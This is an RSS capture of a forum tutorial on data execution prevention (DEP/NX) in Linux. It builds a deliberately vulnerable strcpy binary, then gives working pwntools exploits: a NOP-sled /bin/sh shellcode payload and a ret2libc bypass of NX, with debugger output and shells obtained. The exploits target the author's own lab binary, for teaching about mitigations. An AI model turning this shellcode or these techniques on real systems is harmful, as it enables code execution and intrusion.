<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Exploit Mitigation Techniques - Data Execution Prevention (DEP)</title>
    <link>https://0x00sec.org/t/exploit-mitigation-techniques-data-execution-prevention-dep/4634</link>
    <description># Preface

Welcome to a new series about GNU/Linux exploit mitigation techniques.
We always had these awesome pwn and how2exploit articles.
I wanna shift the focus to the bypassed techniques to create a series about  currently deployed approaches.
Afterwards I&#39;d like to focus on their limitations with a follow up on how to bypass them with a sample demo.

&gt; REMARK: This is the result of my recent self study and might contain faulty information.
    If you find any. Let me know! Thanks

This first article has a small introduction to the whole topic. Later articles will have a bigger focus on possible design choices and bypasses, especially when combining the introduced exploit mitigations.

A special thanks to @_py for proof reading!

## Requirements

  * Some spare minutes
  * a basic understanding of what causes memory corruptions
  * the will to ask or look up unknown terms yourself
  * some ASM/C knowledge for the PoC part

# Introduction
Ever since the first exploits appeared, the amount of publicly known ones has risen tremendously over the last two decades. Even today the total amount of public known exploits is on the rise with the increased security layers in all areas of software development. Nowadays a system breach or hostile takeover has way more impact compared to a decade ago.This leads to an increased popularity in exploiting [web applications](https://courses.cs.washington.edu/courses/cse484/14au/reading/25-years-vulnerabilities.pdf) and reaching any form of code execution in recent days.  Nevertheless systems itself are shown to be [exploitable as ever](https://www.exploit-db.com/exploit-database-statistics/).

The last few years already have more than enough memorable system breaches with one of the most prominent example as of recently: the [**Equifax debacle**](https://www.wired.com/story/equifax-breach-no-excuse/) with a massive leaked dataset from over 140 million customers, showing personal data, addresses and more importantly their social security numbers ([relevant CVE](https://www.cvedetails.com/cve/cve-2017-9805)).

Similar scenarios happened to **Sony** as well, causing leakage of unreleased [movie material](https://www.sans.org/reading-room/whitepapers/casestudies/case-study-critical-controls-sony-implemented-36022) and data from [PlayStation network users](https://venturebeat.com/2011/09/22/security-lessons-from-the-playstation-network-breach/), revealing people&#39;s names, addresses, email addresses, birth dates, user names, passwords, logins, security questions and even credit card information.

Another recent incident happened under the name [**BlueBorne**](https://www.trendmicro.com/vinfo/gb/security/news/internet-of-things/blueborne-bluetooth-vulnerabilities-expose-billions-of-devices-to-hacking), leaving over 8 billion Bluetooth capable devices at risk. The flaw itself lies in the Bluetooth protocol and can lead from information leaks to remote code execution and is triggered over the air.

All the caused havoc in systems needs to get diminished by hardening applications and system internals even further to prevent future attacks more successfully. All major operating systems and big software vendors already adapted such features.  The &quot;incompleteness&quot; and made trade-off deals when implementing such mechanics is the reason for reappearing breaches.

--------
# Data execution prevention (DEP)

## Basic Design
The huge popularity of type unsafe languages, which gives programmers total freedom on memory management, still causes findings of memory corruption bugs today. Patching those is mostly not a big deal and happens frequently.  They remain a real threat though, since many systems, especially in large scale companies run on unpatched legacy code.  There these kind of flaws still exist and may cause harm when abused.  This clearly shows in the still roughly 50 % [market share](http://gs.statcounter.com/os-version-market-share/windows/desktop/worldwide) of Windows 7 in 2017, whose mainstream support already ended in 2015.  
Windows 8 and Windows 10 combined barely reach over 40% market share in 2017.
Moreover new findings are reported monthly and can be looked up at the [CVE DB](https://www.cvedetails.com/browse-by-date.php).

Preventing those memory corruptions to be used is the goal of [data execution prevention (DEP)](http://h10032.www1.hp.com/ctg/Manual/c00387685.pdf).
The mostly hardware based method mitigates any form of code execution from data pages in memory and hence prevents buffer based attacks, which inject malicious code in memory structures. It does so by tagging pages in memory as not executable if its contents are data and keeps them executable if it is code.
When a processor attempts to run code from a not executable marked page an access violation is thrown followed by a control transfer to the operating system for exception handling, resulting in a terminated application. Besides a hardware enforced version of DEP it can also be complemented through software security checks to make better use of implemented exception handling routines.

Overall this technique prevents usage of newly injected code into an applications memory. Even with a proceeded injection of malicious code it cannot be executed anymore as shown later.

DEP was first implemented on Linux based systems by the [PAX project](https://pax.grsecurity.net/docs/pax.txt) since [kernel version 2.6.7](https://lwn.net/Articles/87808/) in 2004. It makes use of a *No eXecute (NX)* bit in AMD, and the *Execute Disable Bit (XD)* in Intel processors on both 32 bit as well as 64 bit architecture.
The counter part for Windows machines was available since Windows XP Service Pack 2 in 2004 as well.




## Limitations

This directly leads to the weaknesses of data execution prevention. It successfully mitigates basic [buffer overflow](http://phrack.org/issues/49/14.html) attacks, but more advanced techniques like [**return to libc (ret2libc)**](http://ieeexplore.ieee.org/document/1324594/), [**return oriented programming (ROP)**](http://ieeexplore.ieee.org/abstract/document/6375725/), or any other return to known code attacks are not accounted for.
These kind of attacks, often labeled under the term [**arc injection**](http://ieeexplore.ieee.org/document/1324594/) make up a big percentage of recent bypasses.
They were developments to bypass DEP in particular, which make use of already present code within an application, whose memory pages are marked executable.

Return to libc uses functions and code from the system library glibc, which is linked against almost any binary. It offers a wide area of available functions.

Return oriented programming on the other hand focuses on finding present code snippets from machine code instructions, which chained together create a gadget.
A gadget consists of a few machine code instructions and always ends with a *return* statement to let the execution return to the abused application before executing the next gadget.
One gadget handles exactly one functionality. Chaining them together to a gadget chain creates an exploit.

&gt; note: [It has been shown that not always a real return statement is needed](https://dl.acm.org/citation.cfm?id=1866370). Instead a function sequence serving as a &#39;trampoline&#39; to transfer control flow is used.




# PoC

To make up for the wall of text above we will continue with some elementary show cases, which hopefully will demonstrate the importance of DEP/NX.

## Abusing a DEP/NX disabled binary
First let&#39;s start abusing a binary, which isn&#39;t hardened at all.

Let&#39;s build a simple vulnerable binary in C ourselves.

    #include &lt;stdio.h&gt;
    #include &lt;string.h&gt;
    #include &lt;stdlib.h&gt;


    char totally_secure(char *arg2[])
    {
        char buffer[256];
        printf(&quot;What is your name?\n&quot;);
        strcpy(buffer, arg2[1]);
        printf(&quot;Hello: %s!\n&quot;, buffer);
    }


    int main(int argc, char *argv[])
    {
     setvbuf(stdin, 0, 2, 0);
     setvbuf(stdout, 0, 2, 0);
     printf(&quot;Hello, I&#39;m your friendly &amp; totally secure binary :)!\n&quot;);
     totally_secure(argv);
     return 0;
    }


This code is vulnerable to a buffer overflow in the function totally_secure()


### Compilation and first look at the binary
    $ gcc vuln.c -o vuln_no_prots -fno-stack-protector -no-pie -Wl,-z,norelro -m32 -z execstack
    $ echo 0 &gt; /proc/sys/kernel/randomize_va_space

First look from inside GDB

    pwndbg&gt; checksec
    [*] &#39;/home/pwnbox/DEP/binary/vuln_no_prots&#39;
        Arch:     i386-32-little
        RELRO:    No RELRO
        Stack:    No canary found
        NX:       NX disabled
        PIE:      No PIE (0x8048000)
        RWX:      Has RWX segments

    pwndbg&gt;  

As we can see we&#39;ve got fully disabled exploit mitigation techniques.
Also no ASLR whatsoever.
This is only for the sake of shining some light on this particular technique.
Combinations of exploit mitigation techniques will be covered at a later time.


### Exploit
A basic overflow is induced by filling the buffer with the following contents:

    pwndbg&gt; c
    Continuing.
    Hello: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB!

    Program received signal SIGSEGV, Segmentation fault.
    0x42424242 in ?? ()
    LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
    [─────────────────────────────────────────────────────────────────REGISTERS──────────────────────────────────────────────────────────────────]
    *EAX  0x119
     EBX  0x8049838 (_GLOBAL_OFFSET_TABLE_) —▸ 0x804974c (_DYNAMIC) ◂— 1
    *ECX  0xffffccd0 ◂— 0x41414141 (&#39;AAAA&#39;)
    *EDX  0xf7fae870 (_IO_stdfile_1_lock) ◂— 0
     EDI  0xf7fad000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x5d /* 0x1b5db0 */
     ESI  0xffffce20 ◂— 0x2
    *EBP  0x41414141 (&#39;AAAA&#39;)
    *ESP  0xffffcde0 —▸ 0xffffce00 ◂— 0x0
    *EIP  0x42424242 (&#39;BBBB&#39;)
    [───────────────────────────────────────────────────────────────────DISASM───────────────────────────────────────────────────────────────────]
    Invalid address 0x42424242


It shows that we have successfully overwritten the `EIP` and `EBP`
The executed [`ret`](http://c9x.me/x86/html/file_module_x86_id_280.html) instruction took the next value off the stack
and loaded that into the  `EIP` register (our &#39;BBBB&#39;) and then code execution tries to continue from there.
So we can fill the buffer with something like `/bin/sh` + `padding`, or try overflowing that position with shell code.
We can craft one ourselves or take an [already nicely prepared shell code from here](http://shell-storm.org/shellcode/)

In the end I used this one, since it honestly doesn&#39;t make much of a difference at the moment:

    46bytes: \x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68


The quick&#39;n&#39;dirty pwntools script:

```python
#!/usr/bin/env python

import argparse
import sys
from pwn import *
from pwnlib import *

context.arch = &#39;i386&#39;
context.os = &#39;linux&#39;
context.endian = &#39;little&#39;
context.word_size = &#39;32&#39;
context.log_level = &#39;DEBUG&#39;

binary = ELF(&#39;./binary/vuln_no_prots&#39;)


def main():
    parser = argparse.ArgumentParser(description=&quot;pwnerator&quot;)
    parser.add_argument(&#39;--dbg&#39;, &#39;-d&#39;, action=&#39;store_true&#39;)
    args = parser.parse_args()

executable = &#39;./binary/vuln_no_prots&#39;
payload = &#39;\x90&#39;*222

# shellcode 46 bytes
# 268 bytes - 46 bytes = length of nop sled
payload += &#39;\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b&#39;
payload += &#39;\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68&#39;

payload += &#39;\x20\xcd\xff\xff&#39; # stack


if args.dbg:
    r = gdb.debug([executable, payload], gdbscript=&quot;&quot;&quot;
            b *main
            continue&quot;&quot;&quot;,
            )
else:
    r = process([executable, payload])
    r.interactive()

if __name__ == &#39;__main__&#39;:
    main()
    sys.exit(0)
```




Executing the whole payload :

    pwnbox@lab:~/DEP$ python bypass_no_prot.py INFO
    [*] &#39;/home/pwnbox/DEP/binary/vuln_no_prots&#39;
        Arch:     i386-32-little
        RELRO:    No RELRO
        Stack:    No canary found
        NX:       NX disabled
        PIE:      No PIE (0x8048000)
        RWX:      Has RWX segments
    [+] Starting local process &#39;./binary/vuln_no_prots&#39;: pid 65330
    [*] Switching to interactive mode
    Hello, I&#39;m your friendly &amp; totally secure binary :)!
    What is your name?
    Hello: \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x901��F1�1��\x80�[1��C\x07\x89\x89C\x0c\xb0\x0b\x8d\x8dS\x0c̀���\xff\xff/bin/sh ��\xff!
    $ whoami
    pwnbox
    $  



We successfully continued execution from our stack.
We *skipped* the `NOP`-sled and our shell got popped.
We easily achieved code execution
So far so good.



## Bypassing DEP/NX
Okay so far this was just like any other simple buffer overflow tutorial out there.
Now things get a little more interesting.
We need to craft a new exploit, for the same binary, but this time with DEP/NX enabled.
The exploit from before will not work anymore as shown below.


Our new binary has the following configuration:


    gcc vuln.c -o vuln_with_nx -fno-stack-protector -no-pie -Wl,-z,norelro -m32

    gdb ./vuln_with_nx

    pwndbg&gt; checksec
    [*] &#39;/home/pwnbox/DEP/binary/vuln_with_nx&#39;
        Arch:     i386-32-little
        RELRO:    No RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      No PIE (0x8048000)

    pwndbg&gt;


Executing our payload from before leaves us with this:

     python bypass_no_prot.py INFO
    [+] Starting local process &#39;./binary/vuln_with_nx&#39;: pid 65946
    [*] Switching to interactive mode
    Hello, I&#39;m your friendly &amp; totally secure binary :)!
    What is your name?
    Hello: \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x901��F1�1��\x80�[1��C\x07\x89\x89C\x0c\xb0\x0b\x8d\x8dS\x0c̀���\xff\xff/bin/sh ��\xff!
    [*] Got EOF while reading in interactive
    $ whoami
    [*] Process &#39;./binary/vuln_with_nx&#39; stopped with exit code -11 (SIGSEGV) (pid 65946)
    [*] Got EOF while sending in interactive


GDB reveals that something  went wrong:

    pwndbg&gt;
    0xffffcd20 in ?? ()
    LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
    [─────────────────────────────────────────────────────────────────REGISTERS──────────────────────────────────────────────────────────────────]
     EAX  0x119
     EBX  0x69622fff
     ECX  0xffffa7d0 ◂— 0x6c6c6548 (&#39;Hell&#39;)
     EDX  0xf7fae870 (_IO_stdfile_1_lock) ◂— 0x0
     EDI  0xf7fad000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b5db0
     ESI  0xffffce50 ◂— 0x2
     EBP  0x68732f6e (&#39;n/sh&#39;)
    *ESP  0xffffce10 —▸ 0xffffce00 ◂— 0xffffe5e8
    *EIP  0xffffcd20 ◂— 0x90909090
    [───────────────────────────────────────────────────────────────────DISASM───────────────────────────────────────────────────────────────────]
       0x804851e  &lt;totally_secure+88&gt;    add    esp, 0x10
       0x8048521  &lt;totally_secure+91&gt;    nop    
       0x8048522  &lt;totally_secure+92&gt;    mov    ebx, dword ptr [ebp - 4]
       0x8048525  &lt;totally_secure+95&gt;    leave  
       0x8048526  &lt;totally_secure+96&gt;    ret    
        ↓
     ► 0xffffcd20                        nop    
       0xffffcd21                        nop    
       0xffffcd22                        nop    
       0xffffcd23                        nop    
       0xffffcd24                        nop    
       0xffffcd25                        nop    
    [───────────────────────────────────────────────────────────────────STACK────────────────────────────────────────────────────────────────────]
    00:0000│ esp  0xffffce10 —▸ 0xffffce00 ◂— 0xffffe5e8
    01:0004│      0xffffce14 ◂— 0x0
    02:0008│      0xffffce18 ◂— 0x2
    03:000c│      0xffffce1c ◂— 0x0
    04:0010│      0xffffce20 ◂— 0x2
    05:0014│      0xffffce24 —▸ 0xffffcee4 —▸ 0xffffd0c2 ◂— 0x69622f2e (&#39;./bi&#39;)
    06:0018│      0xffffce28 —▸ 0xffffcef0 —▸ 0xffffd1e9 ◂— 0x4e5f434c (&#39;LC_N&#39;)
    07:001c│      0xffffce2c —▸ 0xffffce50 ◂— 0x2
    [─────────────────────────────────────────────────────────────────BACKTRACE──────────────────────────────────────────────────────────────────]
     ► f 0 ffffcd20
    pwndbg&gt;


We hit the `NOP`-sled again, so our positioning is correct!
But these memory pages are not getting executed anymore.
The result is a nasty `SEGSEGV` we do not want..


It&#39;s time for some nifty arc injection!

### ret2libc
Starting with return to libc

I won&#39;t cover the technique in detail here, since the focus for these articles lies on the defense side of things.
Furthermore we already have multiple challenge and exploit technique writeups, like @IoTh1nkN0t [ret2libc](https://0x00sec.org/t/exploiting-techniques-000-ret2libc/) article.
So I&#39;m reducing any possible overhead/duplicates.

&gt; note: We&#39;re still paddling in no ASLR waters here. So no advanced ret2libc either. It&#39;s just for demo purposes.


Basic return to libc approach:

    | Top of stack          | EBP      | EIP                                     | Dummy ret addr            | addr of desired shell  |
    |-----------------------|----------|-----------------------------------------|---------------------------|------------------------|
    | AAAAAAAAAA            | AAAA     | Addr of system func (libc)              | e.g. JUNK                 | e.g.    /bin/sh        |



#### Find libc base:  

1. Possible way to find linked libc:

        ldd vuln_with_nx
            linux-gate.so.1 =&gt;  (0xf7ffc000)
            libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7e1d000)         # &lt;- this is it
            /lib/ld-linux.so.2 (0x56555000)



2. Let&#39;s find the base address of libc via gdb:

        pwndbg&gt; vmmap libc
        LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
        0xf7df7000 0xf7fab000 r-xp   1b4000 0      /lib/i386-linux-gnu/libc-2.24.so     # we want this one
        0xf7fab000 0xf7fad000 r--p     2000 1b3000 /lib/i386-linux-gnu/libc-2.24.so
        0xf7fad000 0xf7fae000 rw-p     1000 1b5000 /lib/i386-linux-gnu/libc-2.24.so
        pwndbg&gt;  


#### find /bin/sh offset:

Now it&#39;s time to find the `/bin/sh` in it

    strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep &quot;bin/sh&quot;
        15fa0f /bin/sh                    # &lt;- this is our offset


We can assembly the shell location now via `base` + `offset`. 
It yields: `0xf7df7000` + `15fa0f` = `0xf7f56a0f`

#### find system

    readelf -s /lib/i386-linux-gnu/libc.so.6 | grep &quot;system&quot;
        246: 00116670    68 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr@@GLIBC_2.0
        628: 0003b060    55 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE
        1461: 0003b060    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0        # this is our gem


We can assembly the shell location now via `base` + `offset` .
This yields: `0xf7df7000` + `0x3b060` = `0xf7e32060`



From here on we can assembly out final exploit.
We got everything we need.
Or we can do the following

#### The lazy non ASLR way :)

Print system position:

    pwndbg&gt; print system
    $1 = {&lt;text variable, no debug info&gt;} 0xf7e32060 &lt;system&gt;

Search for a shell candidate:

    pwndbg&gt; find &amp;system, +99999999,  &quot;/bin/sh&quot;
    0xf7f56a0f
    warning: Unable to access 16000 bytes of target memory at 0xf7fb8733, halting search.
    1 pattern found.
    pwndbg&gt;


This directly results in addresses we can use to craft our exploit


#### Final exploit   

Again a quick&#39;n&#39;dirty pwntools script:

```python
#!/usr/bin/env python

import argparse
import sys
from pwn import *
from pwnlib import *

context.arch = &#39;i386&#39;
context.os = &#39;linux&#39;
context.endian = &#39;little&#39;
context.word_size = &#39;32&#39;
context.log_level = &#39;DEBUG&#39;

binary = ELF(&#39;./binary/vuln_with_nx&#39;)
libc = ELF(&#39;/lib/i386-linux-gnu/libc-2.24.so&#39;)


def main():
    parser = argparse.ArgumentParser(description=&#39;pwnage&#39;)
    parser.add_argument(&#39;--dbg&#39;, &#39;-d&#39;, action=&#39;store_true&#39;)
    args = parser.parse_args()

    executable = &#39;./binary/vuln_with_nx&#39;

    libc_base = 0xf7df7000

    binsh = int(libc.search(&quot;/bin/sh&quot;).next())
    print(&quot;[+] Shell located at offset from libc: %s&quot; % hex(binsh))
    shell_addr = libc_base + binsh
    print(&quot;[+] Shell is at address: %s&quot; % hex(shell_addr))
    print(&quot;[+] libc.system() has a %s offset from libc&quot; % hex(libc.symbols[&quot;system&quot;]))
    system_call = int(libc_base + libc.symbols[&quot;system&quot;])
    print(&quot;[+] system call is at address: %s&quot; % hex(system_call))

    payload = &#39;A&#39; * 268
    payload += p32(system_call)
    payload += &#39;JUNK&#39;
    payload += p32(shell_addr)

    if args.dbg:
        r = gdb.debug([executable, payload],
                        gdbscript=&quot;&quot;&quot;
                        b *totally_secure+53
                        continue&quot;&quot;&quot;)
    else:
        r = process([executable, payload])
    r.interactive()

if __name__ == &#39;__main__&#39;:
    main()
    sys.exit(0)
```

Proof of concept:

    python bypass_ret2libc.py INFO
    [*] &#39;/DEP/binary/vuln_with_nx&#39;
        Arch:     i386-32-little
        RELRO:    No RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      No PIE (0x8048000)
    [*] &#39;/lib/i386-linux-gnu/libc-2.24.so&#39;
        Arch:     i386-32-little
        RELRO:    Partial RELRO
        Stack:    Canary found
        NX:       NX enabled
        PIE:      PIE enabled
    [+] Shell located at offset from libc: 0x15fa0f
    [+] Shell is at address: 0xf7f56a0f
    [+] libc.system() has a 0x3b060 offset from libc
    [+] system call is at address: 0xf7e32060
    [+] Starting local process &#39;./binary/vuln_with_nx&#39;: pid 65828
    [*] Switching to interactive mode
    Hello, I&#39;m your friendly &amp; totally secure binary :)!
    What is your name?
    Hello: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA` ��JUNK\x0fj��!
    $ whoami
    pwnbox
    $  

We successfully bypassed DEP/NX on a fairly recent Ubuntu system with our exploit.
You&#39;re invited to try it out yourselves.

&gt; note: Remember, it all depends on your specific libc library to work.


### ROP

Initially return to known code attacks like `ret2libc` were developed to bypass DEP/NX on systems.
Generally all arc injection attacks can bypass DEP/NX and `ROP` might just be considered a ret2libc alternative/powerup. Hence it can be obviously used here too.
We will come back to ROP in a later article.




# Conclusion
This small overview showed the effectiveness and struggles DEP/NX brings to the table.
It can be said that the introduction of this approach tried to fight against one of *the* most exploited vulnerability types out there.
Initially it was very effective, but smart ways around were found with arc injection approaches.

I hope this introduction to the article series was interesting enough to follow.
Feedback is more than welcome, especially if you missed anything while reading this article.
I&#39;ll try my best to incorporate wishes in the next one.

If no voices are raised against this series I&#39;d like to follow up with **stack canaries** as the next topic.


---------

Last but not least I&#39;d like some feedback on the article style if you were so kind.
Depending on the result I can adjust my writing style to fit the desired format!
[poll type=regular]
* keep the wall of text - it fits the series :)
* gimme facts scrub. Bullet points only. short and precise, otherwise TL;DR
* Whatever floats your boat
[/poll]



Peace out~</description>
    
    <lastBuildDate>Tue, 12 Dec 2017 18:33:21 +0000</lastBuildDate>
    <category>Exploit Development</category>
    <atom:link href="https://0x00sec.org/t/exploit-mitigation-techniques-data-execution-prevention-dep/4634.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>Exploit Mitigation Techniques - Data Execution Prevention (DEP)</title>
        <dc:creator><![CDATA[system]]></dc:creator>
        <description><![CDATA[
            <p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
          <p><a href="https://0x00sec.org/t/exploit-mitigation-techniques-data-execution-prevention-dep/4634/3">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/exploit-mitigation-techniques-data-execution-prevention-dep/4634/3</link>
        <pubDate>Thu, 11 Jan 2018 12:06:46 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-4634-3</guid>
        <source url="https://0x00sec.org/t/exploit-mitigation-techniques-data-execution-prevention-dep/4634.rss">Exploit Mitigation Techniques - Data Execution Prevention (DEP)</source>
      </item>
      <item>
        <title>Exploit Mitigation Techniques - Data Execution Prevention (DEP)</title>
        <dc:creator><![CDATA[Sirius]]></dc:creator>
        <description><![CDATA[
            <p>Yesssss!!! Stack Canaries pleaseeee!!!</p>
          <p><a href="https://0x00sec.org/t/exploit-mitigation-techniques-data-execution-prevention-dep/4634/2">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/exploit-mitigation-techniques-data-execution-prevention-dep/4634/2</link>
        <pubDate>Tue, 12 Dec 2017 18:33:21 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-4634-2</guid>
        <source url="https://0x00sec.org/t/exploit-mitigation-techniques-data-execution-prevention-dep/4634.rss">Exploit Mitigation Techniques - Data Execution Prevention (DEP)</source>
      </item>
      <item>
        <title>Exploit Mitigation Techniques - Data Execution Prevention (DEP)</title>
        <dc:creator><![CDATA[ricksanchez]]></dc:creator>
        <description><![CDATA[
            <h1>Preface</h1>
<p>Welcome to a new series about GNU/Linux exploit mitigation techniques.<br>
We always had these awesome pwn and how2exploit articles.<br>
I wanna shift the focus to the bypassed techniques to create a series about  currently deployed approaches.<br>
Afterwards I’d like to focus on their limitations with a follow up on how to bypass them with a sample demo.</p>
<blockquote>
<p>REMARK: This is the result of my recent self study and might contain faulty information.<br>
If you find any. Let me know! Thanks</p>
</blockquote>
<p>This first article has a small introduction to the whole topic. Later articles will have a bigger focus on possible design choices and bypasses, especially when combining the introduced exploit mitigations.</p>
<p>A special thanks to <a class="mention" href="https://0x00sec.org/u/_py">@_py</a> for proof reading!</p>
<h2>Requirements</h2>
<ul>
<li>Some spare minutes</li>
<li>a basic understanding of what causes memory corruptions</li>
<li>the will to ask or look up unknown terms yourself</li>
<li>some ASM/C knowledge for the PoC part</li>
</ul>
<h1>Introduction</h1>
<p>Ever since the first exploits appeared, the amount of publicly known ones has risen tremendously over the last two decades. Even today the total amount of public known exploits is on the rise with the increased security layers in all areas of software development. Nowadays a system breach or hostile takeover has way more impact compared to a decade ago.This leads to an increased popularity in exploiting <a href="https://courses.cs.washington.edu/courses/cse484/14au/reading/25-years-vulnerabilities.pdf">web applications</a> and reaching any form of code execution in recent days.  Nevertheless systems itself are shown to be <a href="https://www.exploit-db.com/exploit-database-statistics/">exploitable as ever</a>.</p>
<p>The last few years already have more than enough memorable system breaches with one of the most prominent example as of recently: the <a href="https://www.wired.com/story/equifax-breach-no-excuse/"><strong>Equifax debacle</strong></a> with a massive leaked dataset from over 140 million customers, showing personal data, addresses and more importantly their social security numbers (<a href="https://www.cvedetails.com/cve/cve-2017-9805">relevant CVE</a>).</p>
<p>Similar scenarios happened to <strong>Sony</strong> as well, causing leakage of unreleased <a href="https://www.sans.org/reading-room/whitepapers/casestudies/case-study-critical-controls-sony-implemented-36022">movie material</a> and data from <a href="https://venturebeat.com/2011/09/22/security-lessons-from-the-playstation-network-breach/">PlayStation network users</a>, revealing people’s names, addresses, email addresses, birth dates, user names, passwords, logins, security questions and even credit card information.</p>
<p>Another recent incident happened under the name <a href="https://www.trendmicro.com/vinfo/gb/security/news/internet-of-things/blueborne-bluetooth-vulnerabilities-expose-billions-of-devices-to-hacking"><strong>BlueBorne</strong></a>, leaving over 8 billion Bluetooth capable devices at risk. The flaw itself lies in the Bluetooth protocol and can lead from information leaks to remote code execution and is triggered over the air.</p>
<p>All the caused havoc in systems needs to get diminished by hardening applications and system internals even further to prevent future attacks more successfully. All major operating systems and big software vendors already adapted such features.  The “incompleteness” and made trade-off deals when implementing such mechanics is the reason for reappearing breaches.</p>
<hr>
<h1>Data execution prevention (DEP)</h1>
<h2>Basic Design</h2>
<p>The huge popularity of type unsafe languages, which gives programmers total freedom on memory management, still causes findings of memory corruption bugs today. Patching those is mostly not a big deal and happens frequently.  They remain a real threat though, since many systems, especially in large scale companies run on unpatched legacy code.  There these kind of flaws still exist and may cause harm when abused.  This clearly shows in the still roughly 50 % <a href="http://gs.statcounter.com/os-version-market-share/windows/desktop/worldwide">market share</a> of Windows 7 in 2017, whose mainstream support already ended in 2015.<br>
Windows 8 and Windows 10 combined barely reach over 40% market share in 2017.<br>
Moreover new findings are reported monthly and can be looked up at the <a href="https://www.cvedetails.com/browse-by-date.php">CVE DB</a>.</p>
<p>Preventing those memory corruptions to be used is the goal of <a href="http://h10032.www1.hp.com/ctg/Manual/c00387685.pdf">data execution prevention (DEP)</a>.<br>
The mostly hardware based method mitigates any form of code execution from data pages in memory and hence prevents buffer based attacks, which inject malicious code in memory structures. It does so by tagging pages in memory as not executable if its contents are data and keeps them executable if it is code.<br>
